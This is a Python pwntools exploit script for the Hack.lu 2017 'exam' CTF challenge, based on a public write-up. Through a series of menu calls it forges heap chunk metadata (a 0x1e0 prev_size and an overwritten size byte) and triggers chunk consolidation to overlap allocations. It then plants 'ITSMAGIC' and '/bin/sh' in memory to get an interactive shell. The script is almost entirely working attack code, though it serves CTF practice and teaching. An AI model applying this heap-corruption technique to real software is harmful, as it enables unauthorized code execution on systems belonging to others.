# This exploit is based off of: https://amritabi0s.wordpress.com/2017/10/19/hack-lu-2017-exam-write-up/

# Import pwntools
from pwn import *

# Establish the target process
target = process('./exam', env={'LD_PRELOAD': './libc.so.6'})
#gdb.attach(target)

# Establish the functions which we will use to interact with the target binary
def addSum(content):
	print target.recvuntil('>')
	target.sendline('1')
	print target.recvuntil('>')
	target.sendline(content)

def remSum(index):
	print target.recvuntil('>')
	target.sendline('2')
	print target.recvuntil('>')
	target.sendline(str(index))
def createCrib():
	print target.recvuntil('>')
	target.sendline('4')
def exam(index):
	print target.recvuntil('>')
	target.sendline('6')
	print target.recvuntil('>')
	target.sendline(str(index))

# Add the first summary
addSum('0'*0x7f)

# Add a heap object that is a different size than the rest of the heap objects
createCrib()

# Allocate three additional summaries to use for consolidation/later purposes
addSum('1'*0x7f)
addSum('2'*0x7f)
addSum('3'*0x7f)

# Free the second summary, than replace it with a value that will edit the third summaries heap metadata to believe the previous heap chunk is free and starts where chunk 0 is
remSum(2)
addSum('4'*0x78 + p64(0x1e0) + "\x90")

# Free the first and last summaries to cause heap consolidation
remSum(0)
remSum(3)

# Allocate another summary to take up space
addSum('5'*0x7f)

# Allocate a last summary to overwrite the data we need to with the first summary
addSum('6'*40 + "ITSMAGIC" + "/bin/sh\x00")

# handle the exam with the summary which we editied the data for
exam(1)

# Drop to an interactive shell
target.interactive()

# This exploit is based off of: https://amritabi0s.wordpress.com/2017/10/19/hack-lu-2017-exam-write-up/
